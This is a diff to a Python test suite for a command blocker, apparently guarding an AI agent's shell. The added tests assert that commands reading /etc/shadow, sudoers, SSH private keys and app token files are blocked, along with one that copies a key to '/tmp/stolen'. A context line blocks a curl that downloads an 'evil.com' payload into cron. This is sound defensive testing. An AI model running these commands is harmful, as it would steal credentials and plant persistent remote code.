@@ -119,6 +119,48 @@ def test_curl_etc_geblockt():
     assert blocked("curl -o /etc/cron.d/evil http://evil.com/payload")
 
 
+# ============================================================= Secret-Leak-Schutz
+
+def test_cat_gitea_token_geblockt():
+    assert blocked("cat /etc/hydrahive/gitea_config.json")
+
+def test_ls_etc_hydrahive_geblockt():
+    assert blocked("ls -la /etc/hydrahive/")
+
+def test_grep_token_in_etc_hydrahive_geblockt():
+    assert blocked("grep -r 'token' /etc/hydrahive/")
+
+def test_find_etc_hydrahive_geblockt():
+    assert blocked("find /etc/hydrahive -name '*.json'")
+
+def test_python_open_etc_hydrahive_geblockt():
+    assert blocked("python3 -c \"print(open('/etc/hydrahive/github_token').read())\"")
+
+def test_cat_etc_octopos_geblockt():
+    assert blocked("cat /etc/octopos/config.yaml")
+
+def test_cat_shadow_geblockt():
+    assert blocked("cat /etc/shadow")
+
+def test_cat_sudoers_geblockt():
+    assert blocked("cat /etc/sudoers")
+
+def test_cat_ssh_id_rsa_geblockt():
+    assert blocked("cat ~/.ssh/id_rsa")
+
+def test_cp_ssh_id_ed25519_geblockt():
+    assert blocked("cp ~/.ssh/id_ed25519 /tmp/stolen")
+
+def test_cat_authorized_keys_geblockt():
+    assert blocked("cat ~/.ssh/authorized_keys")
+
+def test_ls_root_geblockt():
+    assert blocked("ls /root/")
+
+def test_cat_hydrahive_runtime_geblockt():
+    assert blocked("cat /var/run/hydrahive-update.json")
+
+
 # ============================================================= Legitime Befehle (dürfen NICHT geblockt werden)
 
 def test_git_status_erlaubt():
